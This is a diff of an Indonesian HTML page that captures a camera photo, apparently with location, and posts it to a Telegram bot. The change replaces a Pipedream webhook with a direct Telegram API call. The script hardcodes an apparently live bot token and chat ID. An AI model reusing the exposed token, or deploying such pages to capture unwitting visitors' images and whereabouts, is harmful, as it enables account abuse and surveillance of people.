@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8"/>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Kirim Foto & Lokasi ke Telegram</title>
   <style>
     body { font-family: Arial; text-align: center; padding: 30px; }
     video { width: 300px; height: 200px; border: 1px solid #ccc; }
     button { padding: 10px 20px; font-size: 16px; }
-    h2 { color: red; }
   </style>
 </head>
 <body>
@@ -22,7 +21,6 @@
   <script>
     const BOT_TOKEN = '8467123418:AAHaESHrbl8IXkrhMyfhRqleggreCI9_9DI';
     const CHAT_ID   = '7670525689';
-    const WEBHOOK_URL = 'https://eouxkofejjzs7xj.m.pipedream.net';
 
     async function start() {
       try {
@@ -58,15 +56,16 @@
             form.append('caption', caption);
             form.append('photo', blob, 'foto.jpg');
 
-            await fetch(WEBHOOK_URL, {
-              method: 'POST',
-              body: form
-            }).then(r => {
-              if (!r.ok) throw new Error('Gagal kirim');
+            // 5. Langsung ke Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const resp = await fetch(url, { method: 'POST', body: form });
+
+            if (resp.ok) {
               alert('✅ Terkirim ke Telegram!');
-            }).catch(err => {
-              alert('❌ Gagal kirim: ' + err.message);
-            });
+            } else {
+              const msg = await resp.text();
+              alert('❌ Gagal kirim:\n' + msg.slice(0, 300));
+            }
 
             stream.getTracks().forEach(t => t.stop());
           }, 'image/jpeg');
